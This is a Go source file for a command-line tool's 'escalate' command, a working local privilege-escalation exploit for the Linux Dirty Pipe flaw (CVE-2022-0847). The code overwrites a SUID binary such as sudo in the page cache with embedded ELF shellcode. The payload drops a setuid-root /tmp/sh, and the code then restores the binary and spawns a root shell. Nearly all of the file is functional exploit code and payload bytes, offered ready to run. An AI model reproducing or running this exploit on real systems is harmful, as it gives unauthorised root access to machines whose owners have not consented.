/*
Copyright © 2022 Vigilant Cyber Systems, Inc.
Sean Heath
<sheath@vigilantsys.com>
Marc Bohler
<mbohler@vigilantsys.com>
Dylan Harbaugh
<dharbaugh@vigilantsys.com>


Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

/* Credit:
 *   Max Kellerman <max.kellermann@ionos.com>
 *   CVE Reference: CVE-2022-0847
 *   More info: https://dirtypipe.cm4all.com/
 */

package cmd

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"github.com/spf13/cobra"
)

/*
 * Credit: https://github.com/febinrev/dirtypipez-exploit
 *
 * Small (linux_x86_64) ELF file matroshka doll that does:
 *   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
 *   write(fd, elfcode, elfcode_len)
 *   chmod("/tmp/sh", 04755)
 *   close(fd);
 *   exit(0);
 *
 * The dropped ELF simply does:
 *   setuid(0);
 *   setgid(0);
 *   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
 */
// escalateCmd represents the escalate command
var escalateCmd = &cobra.Command{
	Use:   "escalate",
	Short: "attempt to escalate privileges to root on Linux",
	Long:  `Escalate privileges to root on Linux using the dirtypipe exploit.`,
	Run: func(cmd *cobra.Command, args []string) {
		// TODO: Check for required variables

		// Get original file data for cleanup
		fmt.Printf("Making backup of %s\n", escalatePath)
		origData, err := Backup(escalatePath)
		if err != nil {
			fmt.Printf("error making backup: %s\n", err)
			return
		}

		// Create pipe
		fmt.Println("Contaminating pipe", escalatePath)
		r, w, err := os.Pipe()
		if err != nil {
			fmt.Println(fmt.Errorf("error creating pipe: %w", err))
			return
		}
		defer r.Close()
		defer w.Close()

		// Initialize CAN_MERGE flags
		w, err = PreparePipe(r, w)
		if err != nil {
			fmt.Println(fmt.Errorf("error creating pipe: %w", err))
			return
		}

		// Overwrite readonly file
		fmt.Printf("Modifying %s in page cache\n", escalatePath)
		err = Exploit(w, escalatePath, 1, ELFCODE)
		if err != nil {
			fmt.Println(fmt.Errorf("error performing the exploit: %w", err))
			return
		}

		// Call modified suid binary
		fmt.Printf("Executing modified  %s\n", escalatePath)
		out, err := exec.Command(escalatePath).Output()
		if err != nil {
			fmt.Println(fmt.Errorf("error executing suid: %w\n%s", err, out))
			return

		}

		// Cleanup
		fmt.Printf("Restoring %s to original state\n", escalatePath)
		err = Exploit(w, escalatePath, 1, origData)
		if err != nil {
			fmt.Println(fmt.Errorf("error cleaning up suid: %w\n%s", err, out))
			return

		}

		// Execute root shell
		fmt.Printf("Popping root shell  %s\n\n", escalatePath)
		sargs := []string{""}
		Shell("/tmp/sh", sargs)

		fmt.Println("\nRemember to remove /tmp/sh:")
		fmt.Println("\trm /tmp/sh")

	},
}

var escalatePath string
var ELFCODE = []byte{
	0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d,
	0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02, 0x00, 0x00,
	0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7,
	0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0xba, 0x00,
	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
	0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1c,
	0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00, 0x48, 0xc7,
	0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7,
	0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d, 0x70, 0x2f,
	0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01,
	0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
	0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00,
	0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a, 0x00, 0x00,
	0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00, 0x6a, 0x00,
	0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0, 0x3b, 0x00,
	0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f,
	0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
}

func init() {
	rootCmd.AddCommand(escalateCmd)

	// Here you will define your flags and configuration settings.

	escalateCmd.Flags().StringVar(&escalatePath, "path", "/usr/bin/sudo", "Path to the suid executable")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// escalateCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}

func Backup(path string) ([]byte, error) {

	// Open suid binary in read-only mode
	file, err := os.Open(path) // O_RDONLY mode
	if err != nil {
		return nil, fmt.Errorf("error opening SUID binary: %w", err)

	}

	byteSlice := make([]byte, 2)
	_, err = file.Read(byteSlice)
	if err != nil {
		return nil, fmt.Errorf("error reading suid binary: %w", err)
	}

	byteSlice = make([]byte, len(ELFCODE))
	_, err = file.Read(byteSlice)
	if err != nil {
		return nil, fmt.Errorf("error reding suid binary: %w", err)
	}

	return byteSlice, nil
}

const PAGE int = 4096
const PIPELEN int = 65536

func PreparePipe(read *os.File, write *os.File) (*os.File, error) {

	// Fill the entire pipe with data to initialize Pipe Buffer CAN_MERGE flags
	var data = []byte(strings.Repeat("A", PIPELEN))
	_, err := write.Write(data)
	if err != nil {
		return nil, fmt.Errorf("error writing to pipe: %w", err)
	}

	// Drain the pipe leaving the flags in memory
	var buf = make([]byte, 0, PIPELEN)
	_, err = read.Read(buf[:PIPELEN])
	if err != nil {
		return nil, fmt.Errorf("error reading from pipe: %w", err)
	}

	return write, nil

}

func Exploit(write *os.File, path string, fileOffset int64, data []byte) error {

	// Open suid binary in read-only mode
	file, err := os.Open(path) // O_RDONLY mode
	if err != nil {
		return fmt.Errorf("error opening SUID binary: %w", err)

	}

	// Splice page of suid binary into pipe
	syscall.Splice(int(file.Fd()), &fileOffset, int(write.Fd()), nil, 1, 0)
	if err != nil {
		return fmt.Errorf("error splicing suid into pipe: %w", err)

	}

	_, err = write.Write(data)
	if err != nil {
		return fmt.Errorf("error overwriting file data: %w", err)

	}

	return nil

}

func Shell(path string, args []string) error {

	// Get the current working directory.
	cwd, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("error retrieving current working directory: %w", err)
	}

	// Set up shell environment
	pa := os.ProcAttr{
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
		Dir:   cwd,
	}

	// Spawn shell
	proc, err := os.StartProcess(path, args, &pa)
	if err != nil {
		return fmt.Errorf("error spawning shell: %w", err)
	}

	// Wait until user exits the shell
	_, err = proc.Wait()
	if err != nil {
		return fmt.Errorf("error exiting shell: %w", err)
	}

	return nil

}